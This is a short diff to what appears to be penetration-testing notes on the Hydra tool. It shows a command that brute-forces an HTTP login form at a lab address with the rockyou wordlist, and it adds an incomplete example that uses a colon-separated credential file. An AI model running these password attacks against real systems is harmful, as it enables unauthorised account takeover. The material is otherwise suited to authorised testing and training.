@@ -34,3 +34,8 @@ The first field indicates the location of the login form. In this demonstration,
 ```
 sudo hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
 ```
+
+- Colon seperated like (admin:password)
+```
+hydra -C userpass.txt
+```
